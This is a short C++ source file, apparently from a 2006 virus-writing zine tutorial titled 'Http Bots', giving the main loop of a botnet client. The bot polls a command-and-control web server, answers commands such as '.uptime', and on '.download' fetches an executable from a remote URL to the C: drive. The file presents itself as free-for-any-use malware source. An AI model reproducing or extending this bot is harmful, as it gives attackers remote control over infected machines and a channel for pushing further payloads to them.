// HttpBots.cpp : Defines the entry point for the application.
//

/*
Example code to tutorial "Http Bots - the new state of the art"

No Copyright - free for any use

Written by RadiatioN in August-November 2006

Zine and group site:
EOF - Electrical Ordered Freedom
http://www.eof-project.net

My site:
RadiatioN's VX World
http://radiation.eof-project.net

Contact:
radiation[at]eof-project[dot]net

some nice greetings to Sky my good friend :)
*/

#include "stdafx.h"


int APIENTRY _tWinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	char szCommand[512]="";
	//create a intance of the class
	CHttpBot bla;

	//init all values and start message handling
	bla.SetServerUrl("http://www.example.com/");
	bla.SetTimeout(2500);
	bla.StartMessageHandling();

	//for example like a never endling loop to check for commands from the server
	while(1)
	{
		//get a command from webconsole
		if(bla.GetCommandFromQueue(szCommand))
		{
			//parse your commands here received from the server
			if(strcmp(szCommand, ".quit")==0)
			{
				break;
			}
			else if(strcmp(szCommand, ".uptime")==0)
			{
				//in this way you can send replys to the server
				bla.AddResultToSend("I'm up for <time> ;)");
			}
			else if(strcmp(szCommand, ".download")==0)
			{
				DownloadFile("http://example.com/MyNewVersion.exe", "C:\\MyNewVersion.exe");
			}			
		}

		//wait, so CPU is not at 100%
		Sleep(1000);
	}

	return 0;
}
